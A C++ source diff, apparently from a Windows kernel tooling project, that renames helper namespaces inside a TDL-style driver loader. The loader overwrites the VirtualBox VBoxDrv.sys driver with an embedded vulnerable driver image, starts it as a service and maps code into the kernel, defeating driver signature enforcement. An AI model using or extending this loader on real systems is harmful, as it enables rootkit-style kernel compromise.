@@ -3,7 +3,7 @@
 #include <process.h>
 #include "vbox.h"
 
-#include <misc/winnt.hpp>
+#include <misc/native.hpp>
 #include <system/driver/driver_shellcode.hpp>
 
 HINSTANCE  g_hInstance;
@@ -24,29 +24,25 @@ using namespace resurgence;
 BOOL IsVBoxInstalled()
 {
     bool found = false;
-    return NT_SUCCESS(misc::winnt::object_exists(L"\\Device", L"VBoxDrv", &found)) && found;
+    return NT_SUCCESS(native::object_exists(L"\\Device", L"VBoxDrv", &found)) && found;
 }
 BOOL StopVBoxServices(SC_HANDLE hSCManager)
 {
-    using namespace misc;
-
-    return NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxNetAdp")) &&
-        NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxNetLwf")) &&
-        NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxUSBMon")) &&
-        NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxDrv"));
+    return NT_SUCCESS(native::stop_driver(hSCManager, L"VBoxNetAdp")) &&
+        NT_SUCCESS(native::stop_driver(hSCManager, L"VBoxNetLwf")) &&
+        NT_SUCCESS(native::stop_driver(hSCManager, L"VBoxUSBMon")) &&
+        NT_SUCCESS(native::stop_driver(hSCManager, L"VBoxDrv"));
 }
 BOOL BackupVBoxDriver()
 {
-    return NT_SUCCESS(misc::winnt::copy_file(szVBoxDriver, szVBoxBackup));
+    return NT_SUCCESS(native::copy_file(szVBoxDriver, szVBoxBackup));
 }
 BOOL RestoreVBoxDriver()
 {
-    return NT_SUCCESS(misc::winnt::copy_file(szVBoxBackup, szVBoxDriver));
+    return NT_SUCCESS(native::copy_file(szVBoxBackup, szVBoxDriver));
 }
 HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
 {
-    using namespace misc;
-
     HANDLE  hVulnerableDriver = INVALID_HANDLE_VALUE;
     BOOL    vbox_installed = IsVBoxInstalled();
 
@@ -55,33 +51,31 @@ HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
             return INVALID_HANDLE_VALUE;
     }
 
-    winnt::write_file(szVBoxDriver, SHELLCODE_VULNERABLE_DRIVER, SHELLCODE_VULNERABLE_DRIVER_SIZE);
+    native::write_file(szVBoxDriver, SHELLCODE_VULNERABLE_DRIVER, SHELLCODE_VULNERABLE_DRIVER_SIZE);
 
     if(!vbox_installed) {
-        winnt::create_service(hSCManager, L"VBoxDrv", szVBoxDriver);
+        native::create_service(hSCManager, L"VBoxDrv", szVBoxDriver);
     }
 
-    if(NT_SUCCESS(winnt::start_driver(hSCManager, L"VBoxDrv"))) {
-        winnt::get_driver_device(L"VBoxDrv", &hVulnerableDriver);
+    if(NT_SUCCESS(native::start_driver(hSCManager, L"VBoxDrv"))) {
+        native::get_driver_device(L"VBoxDrv", &hVulnerableDriver);
     }
     return hVulnerableDriver;
 }
 BOOL StopVulnerableDriver(SC_HANDLE hSCManager, HANDLE hVulnerableDriver)
 {
-    using namespace misc;
-
     UNICODE_STRING      uStr;
     OBJECT_ATTRIBUTES   ObjectAttributes;
 
     if(hVulnerableDriver != INVALID_HANDLE_VALUE)
         CloseHandle(hVulnerableDriver);
 
-    if(!NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxDrv"))) {
+    if(!NT_SUCCESS(native::stop_driver(hSCManager, L"VBoxDrv"))) {
         return FALSE;
     }
 
     if(!IsVBoxInstalled()) {
-        if(!NT_SUCCESS(winnt::delete_service(hSCManager, L"VBoxDrv")))
+        if(!NT_SUCCESS(native::delete_service(hSCManager, L"VBoxDrv")))
             return FALSE;
 
         RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
@@ -378,7 +372,7 @@ long __stdcall TDLMapDriver(
     NTSTATUS           status;
     RTL_PROCESS_MODULE_INFORMATION ntos;
     RtlZeroMemory(&ntos, sizeof(ntos));
-    resurgence::misc::winnt::get_system_module_info("ntoskrnl.exe", &ntos);
+    resurgence::native::get_system_module_info("ntoskrnl.exe", &ntos);
     while(ntos.ImageBase) {
 
         RtlSecureZeroMemory(&uStr, sizeof(uStr));
